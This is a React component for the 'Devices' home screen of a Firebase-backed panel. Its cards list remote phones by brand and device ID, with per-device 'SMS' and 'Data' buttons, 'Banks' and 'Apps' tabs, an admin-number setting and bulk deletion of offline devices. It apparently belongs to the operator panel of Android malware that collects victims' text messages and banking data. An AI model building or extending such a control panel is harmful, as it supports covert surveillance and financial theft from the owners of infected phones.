
import React, { useState, useEffect, useMemo, useRef } from 'react';
import { DeviceInfo, Notification, User } from '../types';
import { subscribeToUsers, deleteOfflineUsers, subscribeToSystemNotifications, subscribeToNotification } from '../services/firebase';
import AdminNumberModal from './AdminNumberModal';

interface HomeProps {
  onSelectUserForSMS: (user: DeviceInfo) => void;
  onSelectUserForData: (user: DeviceInfo) => void;
  onGlobalSMS: () => void;
  onGlobalData: () => void;
  onLogout: () => void;
  onOpenNotifications: () => void;
  onOpenFavorites: () => void;
  onNav?: (id: string) => void;
  user: User | null;
  highlightUserId?: string | null;
}

function timeAgo(timestamp: number | undefined): string {
  if (!timestamp) return 'Never';
  const now = Date.now();
  const diff = now - timestamp;
  if (diff < 0) return 'Just now';
  const seconds = Math.floor(diff / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);
  if (days > 0) return `${days} day${days > 1 ? 's' : ''} ago`;
  if (hours > 0) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
  if (minutes > 0) return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
  return 'Just now';
}

const Home: React.FC<HomeProps> = ({ 
  onSelectUserForSMS, 
  onSelectUserForData, 
  onGlobalSMS, 
  onGlobalData, 
  onLogout,
  onOpenNotifications,
  onOpenFavorites,
  onNav,
  user,
  highlightUserId
}) => {
  const [users, setUsers] = useState<DeviceInfo[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState<'All' | 'Online' | 'Offline' | 'Unverified'>('All');
  const [favorites, setFavorites] = useState<string[]>([]);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);
  const [autoCleanupUsers, setAutoCleanupUsers] = useState<DeviceInfo[]>([]);
  const [showAutoCleanupModal, setShowAutoCleanupModal] = useState(false);
  const [showDeleteOfflineConfirm, setShowDeleteOfflineConfirm] = useState(false);
  const hasCheckedAutoCleanup = useRef(false);
  const [dontShowOfflineCleanup, setDontShowOfflineCleanup] = useState(false);
  const [unreadCount, setUnreadCount] = useState(0);
  const [notificationMsg, setNotificationMsg] = useState('');
  const deviceRefs = useRef<Record<string, HTMLDivElement | null>>({});

  useEffect(() => {
    if (highlightUserId && deviceRefs.current[highlightUserId]) {
        deviceRefs.current[highlightUserId]?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }, [highlightUserId, users]);

  useEffect(() => {
    const savedFavs = localStorage.getItem('panel_favorites');
    if (savedFavs) setFavorites(JSON.parse(savedFavs));

    const unsubNotify = subscribeToNotification(setNotificationMsg);
    const unsubSystemNotify = subscribeToSystemNotifications((notifs) => {
        setUnreadCount(notifs.filter(n => !n.read).length);
    });

    const unsubscribe = subscribeToUsers((data) => {
      setUsers(data);
      setLoading(false);
      if (!hasCheckedAutoCleanup.current && data.length > 0) {
          const suppressedUntil = localStorage.getItem('suppress_offline_cleanup_until');
          if (!(suppressedUntil && Date.now() < parseInt(suppressedUntil))) {
              const now = Date.now();
              const candidates = data.filter(u => u.Status === 'Offline' && (u.timestamp || 0) > 0 && (now - (u.timestamp || 0) > 72 * 60 * 60 * 1000));
              if (candidates.length > 0) {
                  setAutoCleanupUsers(candidates);
                  setShowAutoCleanupModal(true);
              }
          }
          hasCheckedAutoCleanup.current = true;
      }
    });
    return () => { 
      unsubscribe(); 
      unsubSystemNotify(); 
      unsubNotify(); 
    };
  }, []);

  const toggleFavorite = (userId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    const newFavs = favorites.includes(userId) ? favorites.filter(id => id !== userId) : [...favorites, userId];
    setFavorites(newFavs);
    localStorage.setItem('panel_favorites', JSON.stringify(newFavs));
  };

  const filteredAndSortedUsers = useMemo(() => {
    let result = [...users];
    if (searchTerm) {
      const lower = searchTerm.toLowerCase();
      result = result.filter(u => 
        (u.Brand || '').toLowerCase().includes(lower) || 
        (u.DeviceId || '').toLowerCase().includes(lower) || 
        (u.userId || '').toLowerCase().includes(lower)
      );
    }
    if (filterStatus === 'Unverified') result = result.filter(u => !u.checked);
    else if (filterStatus !== 'All') result = result.filter(u => u.Status === filterStatus);
    return result.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  }, [users, searchTerm, filterStatus]);

  const stats = useMemo(() => ({ 
    total: users.length, 
    online: users.filter(u => u.Status === 'Online').length, 
    offline: users.filter(u => u.Status === 'Offline').length 
  }), [users]);

  const handleDeleteAllOffline = async () => {
    setIsDeleting(true);
    const offlineIds = users.filter(u => u.Status === 'Offline').map(u => u.userId);
    try { 
      await deleteOfflineUsers(offlineIds); 
      setShowDeleteOfflineConfirm(false); 
    } 
    catch (e) { alert("Failed to delete."); } 
    finally { setIsDeleting(false); }
  };
  
  const confirmAutoCleanup = async () => {
    if (dontShowOfflineCleanup) localStorage.setItem('suppress_offline_cleanup_until', (Date.now() + 72 * 60 * 60 * 1000).toString());
    if (autoCleanupUsers.length === 0) { setShowAutoCleanupModal(false); return; }
    setIsDeleting(true);
    try { 
      await deleteOfflineUsers(autoCleanupUsers.map(u => u.userId)); 
      setShowAutoCleanupModal(false); 
    } 
    catch (e) { alert("Auto cleanup failed."); } 
    finally { setIsDeleting(false); }
  };

  const copyDeviceId = (id: string) => {
    navigator.clipboard.writeText(id);
  };

  return (
    <div className="h-full flex flex-col bg-gray-50">
      {notificationMsg && (
        <div className="bg-blue-600 text-white text-sm font-bold h-8 flex items-center z-50 overflow-hidden relative">
            <div className="animate-marquee whitespace-nowrap px-4 absolute w-full">{notificationMsg}</div>
        </div>
      )}

      <div className="bg-white border-b border-gray-200 px-4 py-3 md:px-6 flex flex-col md:flex-row md:items-center justify-between gap-4 sticky top-0 z-20 shadow-sm">
        <div className="flex items-center space-x-3">
          <div className="bg-app-green/10 p-2 rounded-lg"><svg className="w-5 h-5 md:w-6 text-app-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg></div>
          <div className="min-w-0">
            <h1 className="text-lg md:text-xl font-bold text-gray-900 tracking-tight">Devices</h1>
            <div className="flex flex-wrap items-center gap-x-2">
                <p className="text-xs text-gray-500 font-medium whitespace-nowrap">{stats.online} Online / {stats.total} Total</p>
                {user && (
                    <div className="flex items-center space-x-2 text-[10px] font-bold uppercase">
                        <span className="text-gray-300">•</span>
                        <span className="text-app-green">{user.userType || 'Client'}</span>
                        <span className="text-gray-300">•</span>
                        <span className="text-blue-600">{user.keyType || 'APP'}</span>
                    </div>
                )}
            </div>
          </div>
        </div>

        <div className="flex items-center space-x-2 md:space-x-3 w-full md:w-auto overflow-x-auto pb-1 md:pb-0 scrollbar-hide">
          <div className="relative group min-w-[140px] flex-1 md:flex-none">
            <input type="text" className="block w-full pl-10 pr-3 py-2 border border-gray-200 rounded-lg bg-gray-50 text-sm focus:outline-none focus:bg-white focus:ring-2 focus:ring-app-green/20" placeholder="Search..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none"><svg className="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg></div>
          </div>

          <button onClick={onOpenFavorites} className="p-2.5 bg-yellow-50 hover:bg-yellow-100 text-yellow-600 rounded-lg transition-colors focus:outline-none shrink-0" title="Favorites">
             <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
          </button>

          <button onClick={onOpenNotifications} className="p-2.5 bg-gray-100 hover:bg-gray-200 text-gray-600 rounded-lg transition-colors relative focus:outline-none shrink-0">
             <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
             {unreadCount > 0 && <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold w-4 h-4 flex items-center justify-center rounded-full">{unreadCount}</span>}
          </button>

          <select value={filterStatus} onChange={(e) => setFilterStatus(e.target.value as any)} className="appearance-none bg-white border border-gray-200 text-gray-700 py-2 pl-3 pr-8 rounded-lg text-sm font-medium focus:outline-none cursor-pointer shrink-0">
             <option value="All">All Users</option>
             <option value="Online">Online</option>
             <option value="Offline">Offline</option>
             <option value="Unverified">Non-checked</option>
          </select>

          <button onClick={() => setShowAdminModal(true)} className="p-3 text-gray-600 hover:text-app-green rounded-lg shrink-0 transition-colors" title="Settings">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          </button>
          
          <button onClick={() => setShowDeleteOfflineConfirm(true)} disabled={isDeleting || stats.offline === 0} className="p-3 text-red-400 hover:text-red-600 rounded-lg disabled:opacity-30 shrink-0" title="Delete Offline"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>
          <button onClick={onLogout} className="p-3 text-gray-600 hover:text-red-600 rounded-lg shrink-0" title="Logout"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg></button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-4 md:p-6 pb-20 scrollbar-hide">
        {loading ? (
          <div className="flex flex-col items-center justify-center h-64"><div className="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green mb-3"></div><span className="text-sm font-medium">Loading Devices...</span></div>
        ) : filteredAndSortedUsers.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-gray-400 border-2 border-dashed rounded-xl"><p className="font-medium">No devices found</p></div>
        ) : (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4 md:gap-6">
            {filteredAndSortedUsers.map(u => (
              <div 
                key={u.userId} 
                ref={el => { deviceRefs.current[u.userId] = el; }}
                className={`bg-white rounded-xl shadow-sm border ${highlightUserId === u.userId ? 'border-app-green ring-4 ring-app-green/10 transform scale-[1.02]' : 'border-gray-100'} hover:shadow-md transition-all duration-300 flex flex-col overflow-hidden relative group`}
              >
                <div className={`h-1.5 w-full ${u.Status === 'Online' ? 'bg-green-500' : 'bg-gray-200'}`}></div>
                <div className="p-4 md:p-5 flex-1 flex flex-col">
                   <div className="flex justify-between items-start mb-3">
                     <div className="flex-1 pr-2 min-w-0">
                       <div className="flex items-center space-x-1.5 min-w-0">
                          <h3 className="font-bold text-gray-900 leading-tight truncate" title={u.Brand}>{u.Brand || 'Unknown'}</h3>
                          {u.checked && (
                            <div className="text-blue-500 flex-shrink-0" title="Verified User">
                                <svg className="w-5 h-5 fill-current" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" /></svg>
                            </div>
                          )}
                       </div>
                       <button onClick={()=>copyDeviceId(u.DeviceId)} className="text-xs text-gray-500 font-mono mt-1 truncate max-w-full text-left hover:underline">
                          {u.DeviceId}
                       </button>
                     </div>
                     <div className="flex flex-col items-end space-y-1.5">
                       <button onClick={(e) => toggleFavorite(u.userId, e)} className={`p-1.5 rounded-full transition-colors ${favorites.includes(u.userId) ? 'text-yellow-400 bg-yellow-50' : 'text-gray-300 hover:text-yellow-200 bg-gray-50'}`} title="Favorite">
                          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
                       </button>
                       <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded-full ${u.Status === 'Online' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-400'}`}>{u.Status}</span>
                     </div>
                   </div>
                   <div className="mt-auto space-y-2 pt-4">
                     <div className="flex items-center text-xs text-gray-500"><svg className="w-3.5 h-3.5 mr-1.5 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg><span>{timeAgo(u.timestamp)}</span></div>
                     <div className="grid grid-cols-2 gap-3 mt-3">
                        <button onClick={() => onSelectUserForSMS(u)} className="py-2.5 bg-gray-50 hover:bg-app-green hover:text-white text-gray-600 rounded-lg text-sm font-semibold transition-colors focus:outline-none">SMS</button>
                        <button onClick={() => onSelectUserForData(u)} className="py-2.5 bg-gray-50 hover:bg-blue-600 hover:text-white text-gray-600 rounded-lg text-sm font-semibold transition-colors focus:outline-none">Data</button>
                     </div>
                   </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="bg-white border-t border-gray-200 px-2 py-2 flex items-center justify-around sticky bottom-0 z-30 shadow-[0_-1px_3px_rgba(0,0,0,0.05)] md:flex">
        <button onClick={() => onNav?.('HOME')} className={`flex flex-col items-center p-2 rounded-lg transition-colors ${filterStatus === 'All' ? 'text-app-green' : 'text-gray-400'}`}>
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>
          <span className="text-[10px] font-bold mt-1">Home</span>
        </button>
        <button onClick={() => onNav?.('MESSAGES')} className="flex flex-col items-center p-2 text-gray-400 rounded-lg transition-colors hover:text-app-green">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z" /></svg>
          <span className="text-[10px] font-bold mt-1">Apps</span>
        </button>
        <button onClick={() => onNav?.('BANK_SUM')} className="flex flex-col items-center p-2 text-gray-400 rounded-lg transition-colors hover:text-app-green">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
          <span className="text-[10px] font-bold mt-1">Banks</span>
        </button>
        <button onClick={() => onNav?.('GLOBAL_SMS')} className="flex flex-col items-center p-2 text-gray-400 rounded-lg transition-colors hover:text-app-green">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
          <span className="text-[10px] font-bold mt-1">SMS</span>
        </button>
        <button onClick={() => onNav?.('GLOBAL_DATA')} className="flex flex-col items-center p-2 text-gray-400 rounded-lg transition-colors hover:text-app-green">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" /></svg>
          <span className="text-[10px] font-bold mt-1">Data</span>
        </button>
      </div>

      {showAdminModal && <AdminNumberModal onClose={() => setShowAdminModal(false)} />}

      {showDeleteOfflineConfirm && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
            <h3 className="text-lg font-bold text-gray-900 mb-2">Delete Offline Devices?</h3>
            <p className="text-gray-600 mb-6 text-sm">Are you sure you want to remove all {stats.offline} offline devices and their associated data?</p>
            <div className="flex justify-end space-x-3">
              <button onClick={() => setShowDeleteOfflineConfirm(false)} className="px-4 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium transition-colors">Cancel</button>
              <button onClick={handleDeleteAllOffline} className="px-4 py-2 bg-red-600 text-white rounded-lg font-medium hover:bg-red-700 shadow-sm transition-colors">Delete All</button>
            </div>
          </div>
        </div>
      )}

      {showAutoCleanupModal && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="bg-white rounded-xl shadow-2xl p-6 w-full max-w-sm">
             <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-6 h-6 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
             </div>
             <h3 className="text-lg font-bold text-gray-900 text-center mb-2">Device Cleanup</h3>
             <p className="text-sm text-gray-500 text-center mb-6">Found <span className="font-bold text-gray-800">{autoCleanupUsers.length}</span> devices offline for more than 72 hours.</p>
             
             <div className="flex items-center justify-center mb-4">
               <label className="flex items-center space-x-2 cursor-pointer">
                 <input type="checkbox" checked={dontShowOfflineCleanup} onChange={(e) => setDontShowOfflineCleanup(e.target.checked)} className="form-checkbox h-4 w-4 text-blue-600 rounded border-gray-300" />
                 <span className="text-sm text-gray-600">Don't show again for 72h</span>
               </label>
             </div>

             <div className="flex space-x-3">
                <button onClick={() => setShowAutoCleanupModal(false)} className="flex-1 py-2 text-gray-600 hover:bg-gray-100 rounded-lg font-medium transition-colors">Ignore</button>
                <button onClick={confirmAutoCleanup} className="flex-1 py-2 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 shadow-sm transition-colors">Cleanup Now</button>
             </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Home;
